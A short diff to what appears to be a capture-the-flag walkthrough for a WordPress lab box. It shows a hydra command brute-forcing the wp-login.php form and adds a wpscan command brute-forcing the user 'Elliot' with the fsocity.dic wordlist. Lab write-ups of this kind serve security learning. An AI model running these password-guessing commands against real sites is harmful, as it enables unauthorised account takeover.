@@ -23,3 +23,7 @@ Password
 ```bash
 hydra -L example -P fsocity.dic $IP_ADDR http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you enter for the username" -t 30
 ```
+### How to bruteforce input fields with wpscan
+```bash
+wpscan --url http://${IP_ADDR} --passwords fsocity.dic --usernames Elliot  
+```
